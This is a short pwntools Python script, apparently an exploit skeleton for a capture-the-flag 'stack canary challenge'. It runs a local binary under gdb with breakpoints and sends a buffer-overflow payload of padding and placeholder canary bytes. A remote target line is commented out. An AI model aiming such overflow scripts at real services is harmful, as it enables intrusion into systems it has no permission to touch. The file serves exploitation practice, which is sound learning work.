from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./a.out")
#p = remote("1.2.3.4", 30246)
p = gdb.debug("./a.out", '''
b *main+14
b *0x4037ba
b *0x403633
b *0x40375c
b *0x4037da
''')

padA   = b'A' * 136
canary = b'B' * 8
padC   = b'C' * 200



payload  = padA
payload += canary
payload += padC

# stack canary challenge
p.recvline()
p.sendline(payload)

p.recvline()
p.interactive()


